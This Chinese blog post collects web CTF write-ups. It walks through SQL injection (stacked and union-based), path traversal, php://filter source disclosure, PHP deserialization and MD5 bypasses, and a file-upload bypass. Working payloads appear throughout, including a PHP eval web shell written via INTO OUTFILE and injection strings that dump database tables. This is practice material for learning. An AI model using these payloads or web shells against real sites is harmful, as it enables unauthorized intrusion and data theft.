---
title: webctf解题
---
1.  baby-web

    知识点：index.php![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133056990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

url后是1.php
<!--more-->
修改为index.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133327797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



2.  Training-WWW-Robots

    知识点：robots.txt协议，在网络爬取网站时，一个约定的规矩，规定了哪些不能爬取
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133422417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213342850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


 



3.  php.rce

4.  web php_include（文件包含漏洞）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133533547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   御剑扫后台进去第一个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133552852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133609172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)





select "\<?php eval(@\$_POST['shell']);?\>" into outfile '/tmp/22.php'

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133623396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


1.  supersql（sql注入）

    知识点：sql注入，需要学sql语句

    <https://www.cnblogs.com/jokervip/p/12483823.html>

    一进去如下图：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133652344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



发现提交的1’也可以达到与1同样的效果，可以使用sql注入 堆叠注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133707391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



获取数据库目录（1’;show databases;）(堆叠注入)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133719416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


（1’;use supersqli;show tables;）查看表：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133751360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


想法获取表（1919810…）中的列：
（1';use supersqli;show columns from \`1919810931114514\`;）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133813868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


至此supersqli目录下的191…表下的flag列呈现在眼前，想法查看flag的内容即可

我们已经知道列flag是表191的第一个文件使用handler：

(1’;handler \`1919…\` open;handler \`1919…\` read first;)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213383018.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



得到flag

6.ics-06（数字爆破）

知识点：使用bs尝试爆破简单的数字密码，使用intruder模块

题目说报表中心，就点报表中心
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133852864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


Id=1，可以尝试爆破，直接burpsuite

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112133903466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


>    Id=2333

7.Warmup

>   知识点：代码审计

疑问：为何file=source.php不可以直接绕过第一个if
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134011251.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134018180.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134025717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



解：先看源码有 source.php先访问一下

还有个hint.php访问得到

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134050427.png)


返回 代码审计：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134059667.png)


定义一个白名单，判断：变量没有定义或者变量不是字符串，false

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213411518.png)


第二个if语句判断\$page是否存在于\$whitelist数组中，存在则返回true

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134124304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


第三个if语句判断截取后的\$page是否存在于\$whitelist数组中，截取\$page中'?'前部分，存在则返回true

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134135422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


第四个if语句判断url解码并截取后的\$page是否存在于\$whitelist中，存在则返回true

Payload：http://220.249.52.134:43797/source.php?file=source.php?
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134147467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



发现图片不见
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134157792.png)



../../../../../../ffffllllaaaagggg

 8.Newscenter

>   知识点：sql注入

 感觉是sql注入,   先弄出来前面有几字段数使用order by
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134239994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   发现4的话页面就没了，说明有3个字段数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134249638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   1' union select 1,2,table_name from information_schema.tables
>   \#查表名(1,2是为了凑够字段数)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134320593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   1'union select 1,2,column_name from information_schema.columns where
>   table_name='secret_table' \#查列名
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134331364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   1'union select 1,2,fl4g from secret_table \# 查看flag

9.nannannannan-batman
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134346610.png)



>   给了一个附件，记事本打开一堆乱码，是\<script\>代码，需要浏览器打开

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213440941.png)


>   什么都没有，返回记事本wp上方法是把eval改为alert以弹窗形式显示完整代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134420640.png)


>   为什么改为alert？：文档中不能显示就是编码的问题，但是虽然编码不一样，这个函数的内容是没有变的，alert的时候直接显示了一个变量内容，也可以理解为以能显示的编码显示出来

整理：![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134433350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


>   需要满足条件：

1.  e.length==16

2.  e.match(/\^be0f23/)!=null

3.  e.match(/233ac/)!=null

4.  e.match(/e98aa\$/)!=null

5.  e.match(/c7be9/)!=null

    经过：

    document.write(s[o%4][0]);s[o%4].splice(0,1)

    出flag

    正则表达式：正则表达式(regular
    expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。

通过匹配e的值来达到满足if条件；
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134506231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


代码中有\^和\$则e=be0f233ac7be98aa,输入到框中即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213451853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


法二：直接写js代码：

\<script\>

var t=["fl","s_a","i","e}"];

var n=["a","_h0l","n"];

var r=["g{","e","_0"];

var i=["it'","_","n"];

var s=[t,n,r,i];

for(var o=0;o\<13;++o){

document.write(s[o%4][0]);s[o%4].splice(0,1)}

\</script\>

一样的效果，改html后缀直接打开

10.web2（php代码审计+逆向解密）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134537598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



自定义一个加密函数

Strrev反转字符串

Substr选中每个字符

加密过程：反转 ASC+1 base64 反转 rot13

解密反过来即可，可用php，也可用py

尝试一下php
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213455450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



在线工具解一下

11.PHP2

>   index.phps是index.php的源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134615858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



发现源码可以直接查看，一般是不能直接查看的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134624457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



>   查看网页源代码至此看到所有线索

>   代码审计：如果admin=GET[id]则exit

要想拿到key要先经过

\$_GET[id] = urldecode(\$_GET[id]);处理

如果\$_GET[id] == "admin"输出key。

\*：当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode
，（如果输入%61解码为a，在下一个解码处无法解码，所以应该上传a的两次编码即%2561）然后在这段代码中运行时，会自动进行一次urldecode

12\. unserialize3(php反序列化绕过__wakeup())

序列化：序列化
(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134651180.png)


以code=传参数

在使用 unserialize（）反序列化时 会先调用 \__wakeup()函数，

而本题的关键就是如何 绕开 \__wakeup()函数，就是在 反序列化的时候不调用它

**当 序列化的字符串中的属性值个数 大于 属性个数 就会导致反序列化异常 从而跳过
\__wakeup()**

构造序列化的字符串：

\<?php

class xctf{

public \$flag = "111";

}

\$s = new xctf();

echo(serialize(\$s));

?\>

在线运行

得到：O:4:"xctf":1:{s:4:"flag";s:3:"111";}

构造pyload：O:4:"xctf":2:{s:4:"flag";s:3:"111";}
或O:1:"xctf":1:{s:4:"flag";s:3:"111";} 或 O:4:"xctf":1:{s:1:"flag";s:3:"111";}
都可以

在url中输入/?code=

O:4:"xctf":2:{s:4:"flag";s:3:"111";}

13.upload1(文件上传)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134720215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



先查看了一下源代码，对文件上传的类型进行了限制上传
jpg，png类型，记事本写一句话木马，后缀为jpg，绕过前端限制，上传时用bp抓包，修改后缀为php，菜刀连接

14.bugku
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134822267.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134827684.png)




php://filter/read/convert.base64-encode/resource=index.php
这句话的意思是我们用base64编码的方式来读文件index.php；这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag

php://filter
是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数例如
readfile()，file() 和 file_get_contents()
很有用，否则就没有机会在读取内容之前将过滤器应用于流之上。 该协议语法为
php://filter:/\<action\>=\<name\> 比如 php://filter:/resource=ht

15.bugku（提示查看备份文件）

输入index.php.bak

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134848365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


从网址输一个参数，以？开始，？以后的参数返回给\$str,将\$str中的key字段替换为空，

Parse\_str将字符串解析成多个变量,接着md5加密key1，key2；

由于md5无法加密数组所以构造：

?kkeyey1[]=1&kkey2[]=2

或者?kkeyey1=s155964671a&kkeyey2=s1502113478a

16．bugku(sql注入)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134904330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134910341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


发现是以post方式以id传参

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021011213492317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

确定字段数为4，联合注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134934798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


出现skctf库，查看表：

id=0' union select 1,2,3,table_name from information_schema.tables where
table_schema='skctf' \#
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134944604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



出现fl4g表，查看列：

id=0' union select 1,2,3,column\_name from information_schema.columns where
table_name='fl4g' \#
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112134952545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



出现列：skctf\_flag;查看：

id=0' union select 1,2,3,skctf_flag from fl4g\#
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210112135008888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)



